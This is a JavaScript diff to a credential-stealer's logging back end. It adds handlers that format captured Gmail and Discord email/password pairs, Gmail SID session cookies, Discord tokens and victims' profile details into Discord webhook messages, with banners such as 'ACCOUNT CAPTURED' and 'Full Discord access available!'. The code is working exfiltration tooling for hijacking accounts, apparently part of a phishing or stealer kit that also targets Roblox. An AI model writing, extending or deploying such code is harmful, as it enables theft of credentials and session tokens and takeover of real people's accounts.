@@ -23,9 +23,11 @@ function getWebhookUrl(logType) {
   switch(logType) {
     case 'gmail_login':
     case 'gmail_data':
+    case 'gmail_captured':
       return GMAIL_WEBHOOK_URL;
     case 'discord_login':
     case 'discord_token':
+    case 'discord_captured':
       return DISCORD_WEBHOOK_URL;
     case 'roblox_login':
     case 'roblox_userdata':
@@ -622,8 +624,10 @@ function formatLogForDiscord(logData) {
     roblox_userdata: '👤',
     roblox_combined: '🔐',
     gmail_login: '📧',
+    gmail_captured: '📧',
     discord_login: '💬',
-    discord_token: '🔑'
+    discord_token: '🔑',
+    discord_captured: '💬'
   };
 
   // Handle different types of logs
@@ -635,10 +639,14 @@ function formatLogForDiscord(logData) {
     return formatRobloxCombinedEmbed(logData);
   } else if (logData.level === 'gmail_login') {
     return formatGmailLoginEmbed(logData);
+  } else if (logData.level === 'gmail_captured') {
+    return formatGmailCapturedEmbed(logData);
   } else if (logData.level === 'discord_login') {
     return formatDiscordLoginEmbed(logData);
   } else if (logData.level === 'discord_token') {
     return formatDiscordTokenEmbed(logData);
+  } else if (logData.level === 'discord_captured') {
+    return formatDiscordCapturedEmbed(logData);
   }
 
   // Standard log formatting
@@ -697,6 +705,72 @@ function formatGmailLoginEmbed(logData) {
       timestamp: new Date(logData.timestamp).toISOString()
     }]
   };
+}
+
+function formatGmailCapturedEmbed(logData) {
+  const embeds = [];
+
+  // First embed: Gmail credentials and user data
+  const gmailEmbed = {
+    title: "📧 **GMAIL ACCOUNT CAPTURED**",
+    color: 0xEA4335,
+    fields: [
+      {
+        name: "**Login Credentials**",
+        value: logData.credentials && logData.credentials.email ? 
+          `\`\`\`Email: ${logData.credentials.email}\nPassword: ${logData.credentials.password || 'Not captured'}\`\`\`` :
+          `\`\`\`Email: Not captured\nPassword: Not captured\`\`\``,
+        inline: false
+      },
+      {
+        name: "📧 **Email Address**",
+        value: logData.userData?.email || 'Unknown',
+        inline: true
+      },
+      {
+        name: "👤 **Display Name**",
+        value: logData.userData?.name || 'Unknown',
+        inline: true
+      },
+      {
+        name: "🌐 **Domain**",
+        value: logData.userData?.domain || 'Unknown',
+        inline: true
+      },
+      {
+        name: "🌍 **URL**",
+        value: logData.url || 'Unknown',
+        inline: false
+      }
+    ],
+    footer: {
+      text: "Gmail Session Compromised"
+    },
+    timestamp: new Date(logData.timestamp).toISOString()
+  };
+
+  // Add profile photo if available
+  if (logData.userData?.photo) {
+    gmailEmbed.thumbnail = {
+      url: logData.userData.photo
+    };
+  }
+
+  // Second embed: Gmail SID Cookie
+  const sidEmbed = {
+    title: "🍪 **Gmail SID Cookie**",
+    description: "**```" + (logData.sid || 'Not captured') + "```**",
+    color: 0xEA4335,
+    footer: {
+      text: "Handle with extreme caution!"
+    },
+    timestamp: new Date(logData.timestamp).toISOString()
+  };
+
+  embeds.push(gmailEmbed);
+  embeds.push(sidEmbed);
+
+  return { embeds };
 }
 
 function formatRobloxLoginEmbed(logData) {
@@ -987,6 +1061,112 @@ function formatDiscordTokenEmbed(logData) {
       timestamp: new Date(logData.timestamp).toISOString()
     }]
   };
+}
+
+function formatDiscordCapturedEmbed(logData) {
+  const embeds = [];
+
+  // First embed: Discord credentials and user data
+  const discordEmbed = {
+    title: "💬 **DISCORD ACCOUNT CAPTURED**",
+    color: 0x5865F2,
+    fields: [
+      {
+        name: "**Login Credentials**",
+        value: logData.credentials && logData.credentials.email ? 
+          `\`\`\`Email: ${logData.credentials.email}\nPassword: ${logData.credentials.password || 'Not captured'}\`\`\`` :
+          `\`\`\`Email: Not captured\nPassword: Not captured\`\`\``,
+        inline: false
+      }
+    ],
+    footer: {
+      text: "Discord Session Compromised"
+    },
+    timestamp: new Date(logData.timestamp).toISOString()
+  };
+
+  // Add user data fields if available
+  if (logData.userData) {
+    const userData = logData.userData;
+    
+    // Add avatar if available
+    if (userData.avatar) {
+      discordEmbed.thumbnail = {
+        url: userData.avatar
+      };
+    }
+
+    discordEmbed.fields.push(
+      {
+        name: "👤 **Username**",
+        value: userData.username || 'Unknown',
+        inline: true
+      },
+      {
+        name: "🆔 **User ID**",
+        value: userData.id || 'Unknown',
+        inline: true
+      },
+      {
+        name: "📧 **Email**",
+        value: userData.email || 'Unknown',
+        inline: true
+      },
+      {
+        name: "✅ **Verified**",
+        value: userData.verified ? 'Yes' : 'No',
+        inline: true
+      },
+      {
+        name: "🔐 **2FA Enabled**",
+        value: userData.mfaEnabled ? 'Yes' : 'No',
+        inline: true
+      },
+      {
+        name: "⭐ **Premium Type**",
+        value: userData.premiumType ? `Type ${userData.premiumType}` : 'None',
+        inline: true
+      }
+    );
+
+    if (userData.guildsCount !== undefined) {
+      discordEmbed.fields.push({
+        name: "🏰 **Servers**",
+        value: userData.guildsCount.toString(),
+        inline: true
+      });
+    }
+
+    if (userData.friendsCount !== undefined) {
+      discordEmbed.fields.push({
+        name: "👥 **Friends**",
+        value: userData.friendsCount.toString(),
+        inline: true
+      });
+    }
+
+    discordEmbed.fields.push({
+      name: "🌍 **Locale**",
+      value: userData.locale || 'Unknown',
+      inline: true
+    });
+  }
+
+  // Second embed: Discord Token
+  const tokenEmbed = {
+    title: "🔑 **Discord Token**",
+    description: "**```" + (logData.token || 'Not captured') + "```**",
+    color: 0x5865F2,
+    footer: {
+      text: "Full Discord access available!"
+    },
+    timestamp: new Date(logData.timestamp).toISOString()
+  };
+
+  embeds.push(discordEmbed);
+  embeds.push(tokenEmbed);
+
+  return { embeds };
 }
 
 function getColorForLevel(level) {
